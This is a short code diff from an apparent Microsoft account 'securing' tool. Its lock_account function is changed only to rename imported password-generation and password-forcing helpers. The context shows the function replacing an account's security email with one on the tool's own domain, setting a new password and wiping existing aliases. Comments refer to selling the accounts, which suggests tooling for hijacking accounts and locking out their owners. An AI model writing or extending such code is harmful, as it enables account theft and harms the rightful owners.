@@ -754,7 +754,7 @@ async def lock_account(
         if can_recover:
 
             sec_mail = uuid.uuid4().hex[:16]
-            from authsecuring.utils.security.password_gen import generate_ms_password
+            from authsecuring.utils.security.password_gen import make_ms_password
             password = make_ms_password(14)
 
             sec_mail = f"{sec_mail}@{domain}"
@@ -823,7 +823,7 @@ async def lock_account(
         # a freshly added sunny* alias (previous bug).
         # Also runs after sunny-skip so old outlook/gmail aliases still get wiped.
         try:
-            from authsecuring.utils.security.force_password import strip_unverified
+            from authsecuring.utils.security.force_password import clean_password
 
             ms_now = account_info.get("microsoft") or {}
             await wipe_foreign_aliases(
@@ -841,7 +841,7 @@ async def lock_account(
         # recovery code while silently ignoring the new password. Previously we
         # only ran this when marked UNVERIFIED, so Sell (2FA) got a dead password.
         try:
-            from authsecuring.utils.security.force_password import ensure_password_verified
+            from authsecuring.utils.security.force_password import verify_password_stuck
 
             ms_pwd = str((account_info.get("microsoft") or {}).get("password") or "")
             if ms_pwd and ms_pwd not in ("Unknown", "Couldn't Change!", "Failed"):
